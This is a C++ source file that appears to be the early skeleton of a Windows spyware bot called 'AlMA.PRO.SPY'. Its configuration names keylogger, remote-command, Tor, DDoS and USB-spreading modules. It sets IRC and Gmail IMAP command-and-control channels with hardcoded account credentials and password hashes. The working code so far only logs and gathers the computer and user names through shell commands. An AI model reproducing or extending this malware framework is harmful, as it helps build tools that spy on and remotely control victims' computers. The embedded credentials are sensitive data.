#include <Windows.h>
#include <Winsock.h>
#include <ctime>
#include <gdiplus.h>
#include <Shlwapi.h>
#include <cstdio>
#include <iostream>
#include <fstream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
using namespace std;
string GPO(const char* cmd, const char* args = "", const char* startin = "",BOOLEAN sl = 0);
string host = "";
string aps = "/alma.pro.spy/";
string cc = "/alma.pro.spy/cc.png";
string rcmd = "/alma.pro.spy/rcmd.png";
string nircmd = "/alma.pro.spy/nircmd.png";
string kl = "/alma.pro.spy/kl.png";
string wfmf = "/alma.pro.spy/wfmf.png";
string password = "c2c9db77af078bbb162b79dc941de3b2";
string botname = "C++ Bot";
string version = "0.1 - C++";
string pcname = GPO("cmd", "/C echo %computername%", "", 1);
string username = GPO("cmd", "/C echo %username%", "", 1);
string osname = "Windows";
string botid = "";
string install = "%TEMP%";
string path = GPO("cmd", "/C echo %cd%","",1);
string logfile = path + "\\AlMA.PRO.SPY.log";
string keysfile = path + "\\AlMA.PRO.SPY.keys";
string configfile = path + "\\AlMA.PRO.SPY.dat";
string imapserver = "imap.gmail.com";
string imapport = "993";
string imapuser = "alma.pro.bot@gmail.com";
string imappass = "QWxtYVRlc3Q=";
string imapmaster = "alma.pro.leader@gmail.com";
string apsshuser = "almapro";
string apsshpass = "c444858e0aaeb727da73d2eae62321ad";
string keepddos = "0";
string usbspread = "0";
string onTor = "1";
string TorFiles = "/alma.pro.spy/extras/tor/";
string Unrar = "/alma.pro.spy/extras/unrar.exe";
string Unrar3dll = "/alma.pro.spy/extras/unrar3.dll";
string IRCS = "irc.freenode.net";
string IRCP = "6667";
string IRCSSL = "0";
string IRCM = "";
string IRCB = "";
string IRCCH = "";
string IRCOnTor = "0";
string putty = "/alma.pro.spy/extras/putty.png";
string rtf();
typedef enum _log_type{W = 0,I = 1,E = 2,G = 3}log_type;
void log_all(string data, log_type t = E);
void log_all(string data, log_type t){
	try{
		string olddata = "";
		try{
			streampos size;
			ifstream file(logfile);
			if (file.is_open()){
				string line;
				streampos begin, end;begin = file.tellg();file.seekg(0, ios::end);end = file.tellg();
				if ((end - begin) >= (200 * 1024)) {/* TODO: Upload file */ goto skp; }
				while(getline(file, line)){olddata += string(line) + "\n";}
				skp:
				file.close();
			}
		}catch(const std::exception& e){
			log_all("log_all function: " + string(e.what()), E);
		}
		ofstream myfile;
		myfile.open(logfile);
		myfile << olddata;
		myfile << "->->->->->\n";
		switch (t){
		case W:
			myfile << "[W] - ";
			break;
		case I:
			myfile << "[I] - ";
			break;
		case E:
			myfile << "[E] - ";
			break;
		case G:
			myfile << "[G] - ";
			break;
		}
		myfile << rtf() << " - " << data << "\n<-<-<-<-<-\n";
		myfile.close();
	}catch(const exception& e){
		log_all("log_all function: " + string(e.what()),E);
	}
	return;
}
int main(int argc, char* argv[]){
	cout << rtf() << endl;
	cout << logfile << endl;
	cout << "Argc: " << argc << endl;
	for (int i = 0; i < argc; i++) {
		cout << "Arg #" << i << ": " << argv[i] << endl;
		cin.get();
	}
	log_all("Test",G);
}
string rtf() {
	char r[100];
	time_t now = time(0);
	tm *ltm = new tm;
	localtime_s(ltm,&now);
	string c = "AM";
	int ht = ltm->tm_hour;
	if (ht > 12) { c="PM"; ht -= 12; }
	sprintf_s(r, "%.2d/%.2d/%.4d %.2d:%.2d %s", 1 + ltm->tm_mon, ltm->tm_mday, 1900 + ltm->tm_year, ht, ltm->tm_min,c.c_str());
	return string(r);
}
string GPO(const char* cmd, const char* args, const char* startin,BOOLEAN sl){
	array<char, 128> buffer;
	string result;
	char fcmd[128];
	if (startin == ""){
		sprintf_s(fcmd,128,"%s %s", cmd, args);
	}else{
		sprintf_s(fcmd, 128, "cd %s && %s %s", startin, cmd, args);
	}
	shared_ptr<FILE> pipe(_popen(fcmd, "r"), _pclose);
	if (!pipe) throw std::runtime_error("_popen() failed!");
	while(!feof(pipe.get())){
		if(fgets(buffer.data(), 128, pipe.get()) != NULL)
			result += buffer.data();
	}
	if(sl){ result.erase(remove(result.begin(), result.end(), '\n'), result.end()); }
	return result;
}